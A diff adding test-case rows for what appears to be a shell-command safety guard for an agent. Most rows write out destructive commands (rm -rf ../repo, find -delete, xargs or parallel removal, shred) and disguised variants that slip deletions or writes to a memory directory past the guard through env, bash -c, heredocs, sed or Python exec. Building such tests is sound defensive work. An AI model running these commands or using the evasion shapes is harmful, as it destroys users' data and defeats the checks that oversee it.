+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sort -k 2,2 -n x.txt	CRW-941-N07	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	POSIXLY_CORRECT=1 sed 'w {MEMORY}/a' --e p x.txt	CRW-941-P01	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	POSIXLY_CORRECT=1 sed 'w {MEMORY}/a' --expression p x.txt	CRW-941-P02	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	POSIXLY_CORRECT=1 sed 'w {MEMORY}/a' -e p x.txt	CRW-941-P03	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	POSIXLY_CORRECT=1 sed 'w {MEMORY}/a' -ne p x.txt	CRW-941-P04	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	export POSIXLY_CORRECT=1; sed 'w {MEMORY}/a' --e p x.txt	CRW-941-P05	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed 'w {MEMORY}/a' --e p x.txt	CRW-941-P06	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed 'w {MEMORY}/a' -e p x.txt	CRW-941-P07	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	POSIXLY_CORRECT=1 sed 'e gh pr comment 1 -b x' --expression p x.txt	CRW-941-P08	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -n p x.txt -n	CRW-941-P09	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	POSIXLY_CORRECT=1 sed -e p x.txt	CRW-941-P10	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed p -e p x.txt	CRW-941-P11	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed --in='{MEMORY}/*' -e p out.txt	CRW-941-D01	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i'{MEMORY}/*' p out.txt	CRW-941-D02	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -ni'{MEMORY}/*.bak' p sub/out.txt	CRW-941-D03	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed --in-place='{MEMORY}/*' p out.txt	CRW-941-D04	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i'{MEMORY}/../memories/*' p out.txt	CRW-941-D05	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i'{MEMORY}/x' p out.txt	CRW-941-D06	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i.bak p out.txt	CRW-941-D07	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i'bak/*' p out.txt	CRW-941-D08	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i'*.orig' p out.txt	CRW-941-D09	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -i'{MEMORY}/*' -i p out.txt	CRW-941-D10	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed -f s.sed x.txt	CRW-941-F15	row	-
+pre-merge evaluation of 101be077 (/state/crw/mgmt/pre-eval/crw941-101be077.json, defects d1 to d4)	sed --file=s.sed x.txt	CRW-941-F16	row	-
+evaluation of 83a490cef (fix round 1 of the pre-merge evaluation of 101be077, finding d3 in the POSIX option scan)	POSIXLY_CORRECT=1 sed --in='{MEMORY}/*' -e p out.txt --in-place	CRW-941-D11	row	-
+evaluation of 83a490cef (fix round 1 of the pre-merge evaluation of 101be077, finding d3 in the POSIX option scan)	sed --in='{MEMORY}/*' -e p out.txt -i	CRW-941-D12	row	-
+evaluation of 83a490cef (fix round 1 of the pre-merge evaluation of 101be077, finding d3 in the POSIX option scan)	sed --in='{MEMORY}/*' -e p out.txt -i.bak	CRW-941-D13	row	-
+evaluation of 83a490cef (fix round 1 of the pre-merge evaluation of 101be077, finding d3 in the POSIX option scan)	sed --in='{MEMORY}/*' -e p out.txt --in-place=.bak	CRW-941-D14	row	-
+evaluation of 83a490cef (fix round 1 of the pre-merge evaluation of 101be077, finding d3 in the POSIX option scan)	sed -i'{MEMORY}/*' p out.txt -ni	CRW-941-D15	row	-
+evaluation of 83a490cef (fix round 1 of the pre-merge evaluation of 101be077, finding d3 in the POSIX option scan)	sed -i.bak -e p out.txt -i	CRW-941-D16	row	-
+CRW-910 issue (Linear description)	echo cd /tmp `rm -rf ../repo`	CRW-910-01	row	-
+CRW-910 issue (Linear description)	echo cd /tmp "$(rm -rf ../repo)"	CRW-910-02	row	-
+CRW-910 issue (Linear description)	X='rm -rf ../repo'; bash 2>/dev/null -c "$X"	CRW-910-03	row	-
+CRW-910 issue (Linear description)	X='echo x > {MEMORY}/a'; bash 2>/dev/null -c "$X"	CRW-910-04	row	-
+CRW-910 issue (Linear description)	bash << 'EOF'	CRW-910-05	row	-
+CRW-910 issue (Linear description)	bash <<- EOF	CRW-910-06	row	-
+CRW-910 issue (Linear description)	bash << "EOF"	CRW-910-07	row	-
+CRW-910 issue (Linear description)	P=x; python3 << EOF	CRW-910-08	row	-
+CRW-910 issue (Linear description)	env -u HOME rm -rf ../repo	CRW-910-09	row	-
+CRW-910 issue (Linear description)	env --unset=HOME rm -rf ../repo	CRW-910-10	row	-
+CRW-910 issue (Linear description)	env -C . rm -rf ../repo	CRW-910-11	row	-
+CRW-910 issue (Linear description)	env --chdir . rm -rf ../repo	CRW-910-12	row	-
+CRW-910 issue (Linear description)	env -S 'rm -rf ../repo'	CRW-910-13	row	-
+CRW-910 issue (Linear description)	env -i rm -rf ../repo	CRW-910-14	row	-
+CRW-910 issue (Linear description)	X=rm; (	CRW-910-15	row	-
+CRW-910 issue (Linear description)	X='rm -rf ../repo'; eval bash -c '"$X"'	CRW-910-16	row	-
+CRW-910 issue (Linear description)	X='rm -rf ../repo'; echo ${x:- #}; bash -c "$X"	CRW-910-17	row	-
+CRW-910 issue (Linear description)	X='echo x > {MEMORY}/a'; echo ${x:- #}; bash -c "$X"	CRW-910-18	row	-
+CRW-910 issue (Linear description)	bash 2>/dev/null -c "$(printf 'echo x > {MEMORY}/a')"	CRW-910-19	row	-
+CRW-910 issue (Linear description)	echo cd /tmp	CRW-910-20	row	-
+CRW-910 issue (Linear description)	bash </dev/null -c 'echo hi'	CRW-910-21	row	-
+CRW-910 issue (Linear description)	env --ignore-environment ls	CRW-910-22	row	-
+CRW-910 issue (Linear description)	env -v ls	CRW-910-23	row	-
+CRW-910 issue (Linear description)	env --chdir . ls	CRW-910-24	row	-
+CRW-910 issue (Linear description)	(cd /tmp); ls	CRW-910-25	row	-
+CRW-910 issue (Linear description)	cat << EOF	CRW-910-26	row	-
+CRW-910 issue (Linear description)	echo "$(true)" '$(rm -rf ../repo)'	CRW-910-27	row	-
+CRW-910 issue (Linear description)	echo "$(true)x" '$(rm -rf ../repo)'	CRW-910-28	row	-
+CRW-910 issue (Linear description)	env -C {CHECKOUT} rm -rf .	CRW-910-29	row	-
+CRW-910 issue (Linear description)	env -C {MEMORY} sh -c 'echo x > a'	CRW-910-30	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel echo {} ::: a b	CRW-1058-01	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel -j2 -k echo {/.} {#} ::: dir/a.tar.gz other/b.txt	CRW-1058-02	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel echo {1} {2} ::: a b :::+ c d	CRW-1058-03	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'echo hi\n' | bash	CRW-1058-04	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	echo 'echo hi' | sh -s	CRW-1058-05	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	bash /dev/fd/3 3<<'EOF'\necho hi\nEOF	CRW-1058-06	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	bash /dev/fd/3 3<<<'echo hi'	CRW-1058-07	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	python3 /dev/fd/4 3<<'PY' 4<&3\nprint(1)\nPY	CRW-1058-08	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel cp /tmp/x {MEMORY}/{} ::: a	CRW-1058-09	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'echo x > {MEMORY}/a' | bash	CRW-1058-10	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	bash /dev/fd/3 3<<'EOF'\necho x > {MEMORY}/a\nEOF	CRW-1058-11	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel echo x '>' {MEMORY}/{} ::: a	CRW-1058-12	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'gh pr comment 1 -b plain' | bash	CRW-1058-13	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel gh pr comment {} -b plain ::: 1	CRW-1058-14	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel rm -rf {} ::: {CHECKOUT}	CRW-1058-15	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'rm -rf {CHECKOUT}' | bash	CRW-1058-16	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	bash /dev/fd/3 3<<'EOF'\nrm -rf {CHECKOUT}\nEOF	CRW-1058-17	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel rm -rf {} ::: $X	CRW-1058-18	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf "$X" | bash	CRW-1058-19	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel -S host rm -rf {} ::: {CHECKOUT}	CRW-1058-20	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	parallel rm -rf {} :::: list.txt	CRW-1058-21	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'rm -rf {CHECKOUT}' | bash </dev/null	CRW-1058-22	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	bash /dev/fd/3	CRW-1058-23	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'echo hi\n' | bash -s foo	CRW-1058-24	row	-
+CRW-1058 issue text (Linear, 2026-10-09)	printf 'rm -rf {CHECKOUT}' | bash -s foo	CRW-1058-25	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'bash lint.sh && bash refresh.sh'	CRW-1059-01	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'bash lint.sh || bash refresh.sh'	CRW-1059-02	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'bash lint.sh<newline>bash refresh.sh' (two lines of one carried text)	CRW-1059-03	row	-
+CRW-1059 issue text (Linear, read only)	x=$(bash lint.sh; bash refresh.sh)	CRW-1059-04	row	-
+CRW-1059 issue text (Linear, read only)	x=$(bash refresh.sh); bash lint.sh	CRW-1059-05	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'for i in 1 2; do bash lint.sh; bash refresh.sh; done'	CRW-1059-06	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'bash lint.sh | cat; bash refresh.sh'	CRW-1059-07	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'bash lint.sh & bash refresh.sh'	CRW-1059-08	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'f() { bash lint.sh; }; bash refresh.sh; f'	CRW-1059-09	row	-
+CRW-1059 issue text (Linear, read only)	bash -c 'bash lint.sh; bash refresh.sh; bash lint.sh'	CRW-1059-10	row	-
+linear-issue-CRW-1064.json	f() { :; }; for i in 1; do f; done; bash prog.sh	CRW-1064-01	row	-
+linear-issue-CRW-1064.json	for i in 1; do command true; done; bash prog.sh	CRW-1064-02	row	-
+linear-issue-CRW-1064.json	f() { :; }; for i in 1; do f; done; bash /dev/fd/0 </dev/null	CRW-1064-03	row	-
+linear-issue-CRW-1064.json	chdir sub; bash prog.sh	CRW-1064-04	row	-
+linear-issue-CRW-1064.json	f() { cd sub; }; for i in 1; do f; done; bash prog.sh	CRW-1064-05	row	-
+linear-issue-CRW-1064.json	for i in 1; do command cd sub; done; bash prog.sh	CRW-1064-06	row	-
+linear-issue-CRW-1064.json	for i in 1; do builtin cd sub; done; bash prog.sh	CRW-1064-07	row	-
+linear-issue-CRW-1064.json	for i in 1; do chdir sub; done; bash prog.sh	CRW-1064-08	row	-
+linear-issue-CRW-1064.json	chdir ../repo; bash prog.sh	CRW-1064-09	row	-
+linear-issue-CRW-1064.json	f() { f2; }; f2() { cd sub; }; for i in 1; do f; done; bash prog.sh	CRW-1064-10	row	-
+linear-issue-CRW-1064.json	bash /dev/fd/0 </dev/null	CRW-1064-11	row	-
+linear-issue-CRW-1064.json	bash prog.sh	CRW-1064-12	row	-
+pre-eval-crw1064-9701e19e (d1 P0)	n=0; f() { : "$((n=1))"; }; for i in 1; do f; echo x >"dir$n/a"; done	CRW-1064-13	row	-
+pre-eval-crw1064-9701e19e (d1 P0)	n=0; for i in 1; do builtin : "$((n=1))"; echo x >"dir$n/a"; done	CRW-1064-14	row	-
+pre-eval-crw1064-9701e19e (d1 P0)	m=; f() { : "${m:=x}"; }; for i in 1; do f; echo y >"d$m/a"; done	CRW-1064-15	row	-
+pre-eval-crw1064-9701e19e (d1 control)	n=0; for i in 1; do : "$((n+1))"; echo x >"dir$n/a"; done	CRW-1064-16	row	-
+pre-eval-crw1064-9701e19e (d1 P0)	n=0; : "$((n=1))"; echo x >"dir$n/a"	CRW-1064-17	row	-
+pre-eval-crw1064-9701e19e (d2 P0)	chdir() { :; }; for i in 1; do builtin chdir {MEMORY}; echo x >a; done	CRW-1064-18	row	-
+pre-eval-crw1064-9701e19e (d2 P0)	chdir() { :; }; chdir {MEMORY}; echo x >a	CRW-1064-19	row	-
+pre-eval-crw1064-9701e19e (d2 control)	for i in 1; do builtin chdir {MEMORY}; echo x >a; done	CRW-1064-20	row	-
+recheck-20261009-g4-RC-851-v3	python3 -c 'import builtins; builtins \<nl>.exec("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-01	row	-
+recheck-20261009-g4-RC-851-v3d	python3 -c 'import builtins; (builtins \<nl>.exec)("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-02	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; builtins.\<nl>exec("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-03	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; builtins \{CR}<nl>.exec("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-04	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; builtins \<nl> . \<nl> exec("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-05	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; __builtins__ \<nl>.eval("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-06	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; exec(builtins \<nl>.compile("""open(file="<m>/a",mode="w")""", "x", "exec"))'	CRW-851-lc-07	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'exec \<nl>("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-08	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; (builtins.exec) \<nl>("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-09	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; builtins \<nl>\<nl>.exec("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-10	row	-
+added by CRW-851 (line-continuation variant of the 10-09 re-check RC-851-v3)	python3 -c 'import builtins; ((builtins \<nl>.exec))("""open(file="<m>/a",mode="w")""")'	CRW-851-lc-11	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'print("builtins \<nl>.exec(x)")'	CRW-851-lc-b01	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'print("""builtins \<nl>.exec(x)""")'	CRW-851-lc-b02	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'import re; re \<nl>.compile("a")'	CRW-851-lc-b03	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'import re; (re \<nl>.compile)("a")'	CRW-851-lc-b04	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'x = 1 + \<nl>2; print(x)'	CRW-851-lc-b05	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'runner = object(); runner \<nl>.exec("x")'	CRW-851-lc-b06	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'def myexec(s): return s<nl>myexec \<nl>("x")'	CRW-851-lc-b07	row	-
+added by CRW-851 (line-continuation allow counterexample of the 10-09 re-check)	python3 -c 'import mybuiltins; mybuiltins \<nl>.exec("x")'	CRW-851-lc-b08	row	-
+added by CRW-851 (pre-merge evaluation d1: builtins reached as an attribute of another object)	python3 -c 'import types; ...; runner . builtins \<nl>.exec(x)'	CRW-851-lc-b09	row	-
+added by CRW-851 (pre-merge evaluation d1: builtins reached as an attribute of another object)	python3 -c 'import types; ...; runner \<nl>. builtins.exec(x)'	CRW-851-lc-b10	row	-
+added by CRW-851 (pre-merge evaluation d1: builtins reached as an attribute of another object)	python3 -c 'import types; ...; runner \<nl>. \<nl>__builtins__ \<nl>. \<nl>eval(x)'	CRW-851-lc-b11	row	-
+added by CRW-851 (verifier P0: a line end after a dot is a new statement, not an attribute chain)	python3 -c 'import builtins; x = ...<nl>builtins.exec(...)'	CRW-851-lc-12	row	-
+added by CRW-851 (verifier P0: a line end after a dot is a new statement, not an attribute chain)	python3 -c 'import builtins; x = 1.<nl>builtins.exec(...)'	CRW-851-lc-13	row	-
+added by CRW-851 (verifier P0: a line end after a dot is a new statement, not an attribute chain)	python3 -c 'import builtins; x = 1.<nl>__builtins__.eval(...)'	CRW-851-lc-14	row	-
+added by CRW-851 (verifier P0: a line end after a dot is a new statement, not an attribute chain)	python3 -c 'import builtins; x = ...{CR}<nl>builtins.exec(...)'	CRW-851-lc-15	row	-
+added by CRW-851 (verifier P0: a line end after a dot is a new statement, not an attribute chain)	python3 -c 'import builtins<nl>if True:<nl>    x = 1.<nl>    builtins.exec(...)'	CRW-851-lc-16	row	-
+added by CRW-851 (verifier P0: a line end after a dot is a new statement, not an attribute chain)	python3 -c 'import builtins; x = ...<nl>builtins \<nl>.exec(...)'	CRW-851-lc-17	row	-
+linear-issue-CRW-895.json	find ../repo -delete	CRW-895-a1	row	-
+linear-issue-CRW-895.json	find .. -maxdepth 0 -name repo -exec rm -rf {} +	CRW-895-a2	row	-
+linear-issue-CRW-895.json	echo ../repo | xargs rm -rf	CRW-895-a3	row	-
+linear-issue-CRW-895.json	find "$PWD" -exec rm -rf {} +	CRW-895-a4	row	-
+linear-issue-CRW-895.json	find .. -delete	CRW-895-a5	row	-
+linear-issue-CRW-895.json	printf '%s\n' ../repo | xargs rm -rf	CRW-895-a6	row	-
+linear-issue-CRW-895.json	echo "$X" | xargs rm	CRW-895-a7	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo "$X" | xargs rm -rf	CRW-895-a7b	row	-
+linear-issue-CRW-895.json	find . -name '*.o' -delete	CRW-895-c1	row	-
+linear-issue-CRW-895.json	find build -delete	CRW-895-c2	row	-
+linear-issue-CRW-895.json	find . -type f -name '*.tmp' -exec rm {} +	CRW-895-c3	row	-
+linear-issue-CRW-895.json	find . -name '*.o' | xargs rm	CRW-895-c4	row	-
+linear-issue-CRW-895.json	git ls-files -z | xargs -0 rm -f	CRW-895-c5	row	-
+independent verifier of the 10-09 re-check (CRW-895)	git ls-files -z | xargs -0 rm	CRW-895-c5b	row	-
+linear-issue-CRW-895.json	ls | xargs rm	CRW-895-c6	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find . -type f -delete	CRW-895-c7	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find . -newer x -delete	CRW-895-c8	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find ../repo -path '*/build/*' -delete	CRW-895-c9	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find {CHECKOUT} -name '*.o' -delete	CRW-895-c10	row	-
+added by CRW-895 (a shape the issue rules imply)	find . \( -name '*.o' -o -name '*.a' \) -delete	CRW-895-c11	row	-
+added by CRW-895 (a shape the issue rules imply)	find . ! -name keep -delete	CRW-895-c12	row	-
+added by CRW-895 (a shape the issue rules imply)	find . -name '*.tmp' -execdir rm {} +	CRW-895-c13	row	-
+added by CRW-895 (a shape the issue rules imply)	find build -empty -exec rmdir {} +	CRW-895-c14	row	-
+added by CRW-895 (a shape the issue rules imply)	echo build ../repo/build | xargs rm	CRW-895-c15	row	-
+added by CRW-895 (a shape the issue rules imply)	echo . | xargs rm	CRW-895-c16	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. -name repo -print	CRW-895-c17	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. -exec ls {} +	CRW-895-c18	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | xargs ls	CRW-895-c19	row	-
+added by CRW-895 (a shape the issue rules imply)	xargs rm ./build	CRW-895-c20	row	-
+added by CRW-895 (a shape the issue rules imply)	xargs rm < /dev/null	CRW-895-c21	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../other | xargs rm	CRW-895-c22	row	-
+added by CRW-895 (a shape the issue rules imply)	find -L . -name '*.o' -delete	CRW-895-c23	row	-
+added by CRW-895 (a shape the issue rules imply)	find . -name -delete	CRW-895-c24	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find .. -exec rmdir {} +	CRW-895-d1	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find ../repo -exec shred {} +	CRW-895-d2	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find ../repo -exec unlink {} \;	CRW-895-d3	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find ../repo -exec git worktree remove {} \;	CRW-895-d4	row	-
+independent verifier of the 10-09 re-check (CRW-895)	find ../repo -okdir rm -rf {} \;	CRW-895-d5	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -execdir rm -rf {} +	CRW-895-d6	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -ok rm -rf {} \;	CRW-895-d7	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -exec rm {} +	CRW-895-d8	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. -name repo -exec rm {} +	CRW-895-d9	row	-
+added by CRW-895 (a shape the issue rules imply)	find {CHECKOUT}/.. -name repo -delete	CRW-895-d10	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find -L ../repo -delete	CRW-895-d11	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	find ../repo -name a -o -delete	CRW-895-d12	row	-
+added by CRW-895 (a shape the issue rules imply)	find . -exec rm {} +	CRW-895-d13	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. -name repo -execdir git worktree remove {} \;	CRW-895-d14	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -exec git -C .. worktree remove {} \;	CRW-895-d15	row	-
+added by CRW-895 (a shape the issue rules imply)	find {CHECKOUT} -exec rmdir {} +	CRW-895-d16	row	-
+added by CRW-895 (a shape the issue rules imply)	find build ../repo -delete	CRW-895-d17	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. <<<x -delete	CRW-895-d18	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | xargs git worktree remove	CRW-895-e1	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo ../repo | xargs rm	CRW-895-e2	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | xargs rmdir	CRW-895-e3	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo ../repo | xargs unlink	CRW-895-e4	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo ../repo | xargs shred	CRW-895-e5	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo "$(cat list.txt)" | xargs rm	CRW-895-e6	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ~ | xargs rm	CRW-895-e7	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	xargs -a list.txt rm	CRW-895-e8	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	xargs rm <<< ../repo	CRW-895-e9	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	xargs rm << EOF\n../repo\nEOF	CRW-895-e10	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo {CHECKOUT} | xargs rm	CRW-895-e11	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo .. | xargs rm	CRW-895-e12	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	printf '../repo\n' | xargs rm	CRW-895-e13	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	printf '../repo\0' | xargs -0 rm	CRW-895-e14	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo ../repo | xargs -I{} rm {}	CRW-895-e15	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | cat | xargs rm	CRW-895-e16	row	-
+recheck-20261009/g5 (10-09 re-check of CRW-895)	echo $PWD | xargs rm	CRW-895-e17	row	-
+added by CRW-895 (a shape the issue rules imply)	xargs rm < list.txt	CRW-895-e18	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo/. | xargs rm	CRW-895-e19	row	-
+added by CRW-895 (a shape the issue rules imply)	echo build ../repo | xargs rmdir	CRW-895-e20	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -type f | xargs rm	CRW-895-e21	row	-
+added by CRW-895 (a shape the issue rules imply)	echo build | sed s/build/../repo/ | xargs rm	CRW-895-e22	row	-
+added by CRW-895 (a shape the issue rules imply)	(echo ../repo) | xargs rm	CRW-895-e23	row	-
+added by CRW-895 (a shape the issue rules imply)	xargs git worktree remove <<< {CHECKOUT}	CRW-895-e24	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | xargs -I{} sh -c 'rm {}'	CRW-895-e25	row	-
+added by CRW-895 (a shape the issue rules imply)	nohup echo ../repo | xargs rm	CRW-895-e26	row	-
+added by CRW-895 (a shape the issue rules imply)	cat << EOF | xargs rm\n../repo\nEOF	CRW-895-e27	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | parallel git worktree remove	CRW-895-p1	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | parallel rmdir	CRW-895-p2	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | parallel unlink	CRW-895-p3	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | parallel shred	CRW-895-p4	row	-
+independent verifier of the 10-09 re-check (CRW-895)	echo ../repo | parallel rm -rf	CRW-895-p5	row	-
+added by CRW-895 (a shape the issue rules imply)	ls | parallel rm	CRW-895-p6	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -type d -name build -prune -o -type f -delete	CRW-895-c25	row	-
+added by CRW-895 (a shape the issue rules imply)	echo repo | xargs git -C .. status	CRW-895-c26	row	-
+added by CRW-895 (a shape the issue rules imply)	ls ../repo | xargs rmdir	CRW-895-c27	row	-
+added by CRW-895 (a shape the issue rules imply)	cat list.txt | xargs rm	CRW-895-c28	row	-
+added by CRW-895 (a shape the issue rules imply)	xargs git worktree remove <<< repo	CRW-895-c29	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo \( -name '*.o' -o -name '*.a' \) -delete	CRW-895-c30	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | tee x | xargs rmdir	CRW-895-e28	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | sort | uniq | xargs rmdir	CRW-895-e29	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | sed s/a/b/ | xargs rmdir	CRW-895-e30	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | cut -d, -f1 | xargs rmdir	CRW-895-e31	row	-
+added by CRW-895 (a shape the issue rules imply)	xargs git -C .. worktree remove <<< repo	CRW-895-e32	row	-
+added by CRW-895 (a shape the issue rules imply)	cd ..; echo repo | xargs rmdir	CRW-895-e33	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | env xargs rmdir	CRW-895-e34	row	-
